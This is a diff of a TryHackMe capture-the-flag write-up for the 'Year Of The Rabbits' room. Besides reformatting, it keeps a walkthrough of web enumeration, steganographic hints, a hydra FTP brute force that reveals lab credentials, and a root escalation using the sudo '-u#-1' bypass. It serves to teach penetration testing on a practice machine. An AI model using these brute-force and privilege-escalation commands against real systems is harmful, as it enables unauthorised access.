@@ -1,8 +1,7 @@
 ---
-layout: post
 title: Year Of The Rabbits
-subtitle: New Year Series
-tags: [TryHackMe,Easy,New Year Series,Linux,Privilege Escalation,Steganography,Sudo Exploit]
+category: [writeups,TryHackMe]
+tags: [Linux,Privilege-Escalation,Steganography,Sudo-Exploit]
 # date: 13/07/2022
 ---
 # Year Of The Rabbits 
@@ -11,18 +10,9 @@ tags: [TryHackMe,Easy,New Year Series,Linux,Privilege Escalation,Steganography,S
 - Operating System : `Linux`
 
 # Table of Content
-- [Rustscan result](#rustscan-result)
 - [Nmap Result](#nmap-result)
 - [Method to solve the challenge](#method-to-solve-the-challenge)
 - [Privilege Escalation](#privilege-escalation)
-- [Flag](#flag)
-
-## Rustscan Result
-```
-Open 10.10.13.237:21
-Open 10.10.13.237:22
-Open 10.10.13.237:80
-```
 
 ## Nmap Result
 ```
@@ -51,8 +41,10 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 # Method to solve the challenge
-As usual, we will start with website after checking for each version and confirmed that they are not vulnerable. <br>
-![image](https://user-images.githubusercontent.com/88197307/179186437-3e2b3b35-8822-4a94-b05e-d275724725b4.png) <br>
+As usual, we will start with website after checking for each version and confirmed that they are not vulnerable.
+<br>
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-1.png) 
+<br>
 The website is just a normal default page. Since there are nothing much to search, we will be using `gobuster` to search for subdirectories in the website.
 ```
 gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.13.237         
@@ -81,12 +73,18 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 2022/07/15 04:41:32 Finished
 ===============================================================
 ```
-Based on the result, `/assets/` seems to be only tip which might allow us to continue our challenge. <br>
-![image](https://user-images.githubusercontent.com/88197307/179187282-d01de081-085c-4ca8-883f-1d87719c3b62.png) <br>
-The mp4 file is really RickRolled and therefore we are only able to continue with the CSS file. <br>
-![image](https://user-images.githubusercontent.com/88197307/179187622-c7072fa5-bc9e-43dd-ac4c-03e85610b866.png) <br>
-Inside the CSS file, there is our next tip which is giving us a hidden file named `/sup3r_s3cr3t_fl4g.php`. When we redirect to the file, it pop ups a message as below and we got rick rolled again! <br>
-![image](https://user-images.githubusercontent.com/88197307/179188055-8bfed0e8-70cc-4be1-b1c0-5c9701a79877.png) <br>
+Based on the result, `/assets/` seems to be only tip which might allow us to continue our challenge. 
+<br>
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-2.png)
+<br>
+The mp4 file is really RickRolled and therefore we are only able to continue with the CSS file. 
+<br>
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-3.png)
+<br>
+Inside the CSS file, there is our next tip which is giving us a hidden file named `/sup3r_s3cr3t_fl4g.php`. When we redirect to the file, it pop ups a message as below and we got rick rolled again! 
+<br>
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-4.png) 
+<br>
 Since it asked us to turn off javascript, we can either use `burpsuite` or `curl` to look for our next tips.
 ```
 curl -IR 10.10.13.237/sup3r_s3cr3t_fl4g.php
@@ -97,10 +95,12 @@ Server: Apache/2.4.10 (Debian)
 Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
 Content-Type: text/html; charset=UTF-8
 ```
-Our next tips was another hidden directory which is `/WExYY2Cv-qU`. When we redirect into the hidden directory, it was only a image there. <br>
-![image](https://user-images.githubusercontent.com/88197307/179190524-645bacb2-1ea3-481b-8edc-05c2d89c4d6b.png)
+Our next tips was another hidden directory which is `/WExYY2Cv-qU`. When we redirect into the hidden directory, it was only a image there.
 <br>
-Since we have no other clue, the image mighthave some clues since there are alot of CTF out there which hide data inside images. After exploring with the image, there is a wonderful tip for us to proceed with our next session which is FTP.
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-5.png)
+<br>
+Since we have no other clue, the image might have some clues since there are a lot of CTF out there which hide data inside images. After exploring with the image, there is a wonderful tip for us to proceed with our next session which is FTP.
+
 ```
 strings Hot_Babe.png
 ...<many random strings>
@@ -189,7 +189,9 @@ Vi^Qf+u%0*q_S
 1Fvdp&bNl3#&l
 zLH%Ot0Bw&c%9
 ```
+
 Inside the image file, there is a sentence which told us that the username of ftp is `ftpuser` and the password is within the list given. We now can brute force ftp with the given username and password list.
+
 ```
 hydra -l ftpuser -P pass.txt 10.10.13.237 ftp
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -201,7 +203,9 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-15 05:04:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-15 05:04:41
 ```
+
 We now have our FTP credentials `ftpuser:5iez1wGXKfPKQ` cand we can proceed with FTP to look for other tips. There is only 1 file inside the ftp server. We are not able to read the file but we are able to download the whole file from ftp server.
+
 ```
 cat Eli\'s_Creds.txt                       
 +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
@@ -218,9 +222,9 @@ cat Eli\'s_Creds.txt
 ```
 After downloading the file and view the data inside, we saw some weird character which is not human language. Luckily, there is a [online tool](https://www.dcode.fr/cipher-identifier) out there which could help us to identify that is this and the content inside.
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179192516-ffed07fc-6271-4221-957c-ac42e1d48d02.png)
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-6.png)
 <br>
-![image](https://user-images.githubusercontent.com/88197307/179192590-5e334d78-be45-45a0-99af-c6484ddd2436.png)
+![](../assets/img/posts/2022-07-15-Year-Of-The-Rabbits-7.png)
 <br>
 The content was huge as it gave us the credentials. The credentials was use to get shell from ssh but it is not a root account and we will need to perform privilege escalation.
 
@@ -275,12 +279,3 @@ root@year-of-the-rabbit:/usr/games/s3cr3t# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 We manage to get root account! The reason behind this exploit is that version of `sudo` somehow read `-u#-1` as `-u#0` and `0` is also the uid for root.
-
-# Flag
-User Flag: <br>
-![image](https://user-images.githubusercontent.com/88197307/179195920-cbd5c0d4-4048-4444-8b58-861e776833bf.png) <br>
-Root Flag: <br>
-![image](https://user-images.githubusercontent.com/88197307/179196014-7b6fab63-7a6a-4cd4-982f-16b75851c1df.png)
-
-
-
